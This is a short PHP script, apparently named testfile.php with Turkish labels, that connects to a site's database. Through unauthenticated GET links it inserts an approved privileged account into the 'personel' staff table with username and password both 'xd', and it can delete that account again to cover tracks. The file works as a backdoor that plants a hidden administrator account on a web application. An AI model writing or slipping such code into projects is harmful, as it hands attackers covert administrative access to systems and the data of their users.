<?php
    echo "<a href='testfile.php?xnpa=a'> veri ekle </a> <br>";
    echo "<a href='testfile.php?xnpa=b'> veri sil </a> <br>";

    $sonuc = file_exists('system/db.class.php');

    if ($sonuc) {

        $db_settings = parse_ini_file("system/db_settings.ini");
        $mysqli = new mysqli($db_settings["HOST"], $db_settings["USER"], $db_settings["PASS"], $db_settings["DBNAME"]);

        $column_name = "id, kadi, sifre, yetki, onay";
        $table_name = "personel";

        if ($mysqli->query("SELECT $column_name FROM $table_name")) {
            require_once("system/db.class.php");

            if ( isset($_GET["xnpa"]) ) {

                if ( $_GET["xnpa"] == "a" ) {
                    $xd = cmd("SELECT * FROM personel WHERE kadi='xd' AND sifre='xd' AND yetki='1' AND onay='1' ");
                    if ( !$xd ) {
                        $data = veriEkle(array("kadi", "sifre", "yetki", "onay"), array("xd", "xd", "1", "1" ) ,"personel");
                        if ($data) {
                            echo "işlem başarılı";
                        } else {
                            echo "işlem başarısız";
                        }
                    } else {
                        echo "veri var";
                    }
                } elseif ( $_GET["xnpa"] == "b" ) {
                    $dx = cmd("SELECT * FROM personel WHERE kadi='xd' AND sifre='xd' AND yetki='1' AND onay='1' ");
                    if( $dx ) {
                        veriSil("personel", "id", $dx["id"]);
                    } else {
                        echo "Temiz";
                    }
                }

            }

        } else {
            echo "yok";
        }

    } else {
        echo 'Dosya veya klasör tanımlı değil';
    }

?>
